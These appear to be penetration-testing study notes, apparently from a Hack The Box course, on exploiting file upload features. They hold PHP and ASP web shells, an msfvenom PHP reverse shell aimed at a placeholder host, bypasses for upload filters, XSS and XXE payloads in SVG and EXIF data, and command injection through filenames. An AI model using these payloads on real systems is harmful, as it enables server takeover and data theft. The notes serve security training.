
## Table of Contents:

- [[#Vulnerability Identification]]
- [[#Client Side Validation Bypass]]
- [[#Blacklist Filters]]
- [[#Whitelist Filters]]
- [[#Type Filters]]
- [[#MIME-Type]]
- [[#Limited File Uploads]]
- [[#Other Uploads Attacks]]
- [[#Windows-specific Attacks]]

---

## Vulnerability Identification

```php
echo <?php echo "Sup Pookies!";?> > test.php
## Create a test.php file and upload it, usually at /uploads/filename.php
```

#### Web Shell and Reverse Shells

```php
<?php system($_REQUEST['cmd']); ?>
```

```ASP.NET
<% eval request('cmd') %>
```

```shell
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

---

## Client Side Validation Bypass

#### 1. Back End Request Modification (Via Burp)

If we capture the upload request with `Burp`, we see a sent request. The two important parts in the request are `filename="HTB.png"` and the file content at the end of the request. If we modify the `filename` to `shell.php` and modify the content to the web shell we used in the previous section; we would be uploading a `PHP` web shell instead of an image.

#### 2. Disabling Front-end Verification

To start, we can click [`CTRL+SHIFT+C`] to toggle the browser's `Page Inspector`.
Click on the element that you need to bypass like an image to upload.
We could run into this kind of HTML:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

There is this JS function: `onchange="checkFile(this)"` 
To get the details of this function, we can go to the browser's `Console` by clicking [`CTRL+SHIFT+K`], and then we can type the function's name (`checkFile`) to get its details:

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

We can add `PHP` as one of the allowed extensions or modify the function to remove the extension check. We can go back to our inspector, click on the profile image again, double-click on the function name (`checkFile`) , and delete it.

We can click on the profile image in Inspector and see the URL of our uploaded web shell. These steps are for `firefox`, chrome use 'override' etc. 

---

## Blacklist Filters

The weakest form of validation amongst these is `testing the file extension against a blacklist of extension` to determine whether the upload request should be blocked.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

#### Fuzzing Extensions

Lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
Go to intruder and Fuzz each extension in `filename=file.php` (file\$.php\$)
Once we find an extension that is not blacklisted we have remote code execution if the web server configuration permits it. 

---

## Whitelist Filters

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

#### Double Extension

For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`)

#### Reverse Double Extension

Usually web server misconfiguration, in `/etc/apache2/mods-enabled/php7.4.conf`:
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

The above configuration is how the web server determines which files to allow PHP code execution.

 In such cases, any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension.
 the file name (`shell.php.jpg`) should pass the earlier whitelist test as it ends with (`.jpg`), and it would be able to execute PHP code due to the above misconfiguration, as it contains (`.php`) in its name.

#### Character Injection

We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

The following are some of the characters we may try injecting:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Script that generate a permutation of the filename:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

---
## Type Filters

There are two common methods for validating the file content: `Content-Type Header` or `File Content`.

#### Content-Type

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

We may start by fuzzing the Content-Type header with SecLists [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) through Burp Intruder, to see which types are allowed.

If only image are allowed:
```shell
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

``` Note
A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.
```


---
## MIME-Type

`MIME-Type`. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its general format and bytes structure.

For GIF: Change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension. (GIF87a or GIF89a)

Many other image types have non-printable bytes for their file signatures, while a `GIF` image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.

---

## Limited File Uploads

#### XSS

Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page.

```shell
> exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
> exiftool HTB.jpg
(Displays Metadata)
```

Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

#### XXE

Using XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others.
We may utilize the XXE vulnerability to enumerate the internally available services or even call private APIs to perform private actions performing a SSRF attack. 

XXE to read source code in PHP web app with this payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

----

## Other Uploads Attacks

#### Injection in filename

For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution.

Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.

---

## Windows-specific Attacks

One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. 

Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.

Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.

For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~1.CON`) to overwrite the `web.conf` file.

---